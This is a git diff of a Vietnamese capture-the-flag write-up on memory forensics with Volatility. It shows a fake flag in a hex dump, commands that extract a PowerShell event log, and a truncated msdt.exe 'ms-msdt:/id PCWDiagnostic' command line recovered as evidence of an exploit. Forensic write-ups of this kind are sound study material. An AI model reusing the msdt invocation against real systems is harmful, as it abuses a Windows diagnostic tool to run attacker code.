@@ -114,7 +114,7 @@ Command line : "C:\Windows\system32\NOTEPAD.EXE" C:\Users\gg\Desktop\note.txt
 0000000010: 72 72 79 2e 20 63 73 63 74 66 7b 6e 6f 74 5f 72   rry..csctf{not_r
 0000000020: 65 61 6c 6c 6c 79 5f 74 68 65 5f 66 6c 61 67 7d   eallly_the_flag}
 ```
-- Nó 1 fake flag
+- Nó là 1 fake flag
 - Khi sử dụng plugin `cmdline` cho challenge này thì vấn đề đã xảy ra: Đối với volatility2 thì không hiển thị process của `msdt.exe`, nhưng đối với volatility3 thì có (đây là chìa khoá của cả bài)
 
 ```
@@ -135,6 +135,8 @@ C:\Windows\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_R
 - Ý tưởng của mình là lấy đoạn code của file QOaAdcT6dq.ps1 được lưu lại logs file của windows event logs, vì thế ta sẽ sử dụng plugin filescan để quét các tệp có đuôi evtx
 - Mình sẽ trích xuất file `Windows PowerShell.evtx` ra
 > python3 vol.py -f /home/kali/Downloads/mem/mem.dmp windows.filescan | grep evtx
+
+
 > python3 vol.py -f /home/kali/Downloads/mem/mem.dmp windows.dumpfiles --virtaddr 0xe50762216c60
 
 - Mở file này ra với công cụ Event Viewer thì thấy 1 đoạn code có liên quan đến file flag.jpg 
